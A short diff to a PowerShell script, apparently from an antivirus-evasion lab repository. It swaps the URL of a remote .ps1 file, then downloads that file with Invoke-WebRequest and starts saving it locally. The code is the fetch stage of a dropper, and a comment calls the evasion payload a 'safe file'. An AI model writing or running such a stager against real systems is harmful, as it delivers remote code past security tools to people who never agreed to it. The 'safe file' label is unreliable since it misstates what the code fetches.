@@ -1,5 +1,5 @@
 # URL to download safe file
-$scriptUrl = "https://raw.githubusercontent.com/salahgeek/LAB/main/LAS/Av-evasion/8443.ps1"
+$scriptUrl = "https://raw.githubusercontent.com/salahgeek/LAB/main/LAS/Av-evasion/clips.ps1"
 # Download script
 $scriptBytes = Invoke-WebRequest -Uri $scriptUrl -UseBasicParsing -Method Get
 # Save the script to a file
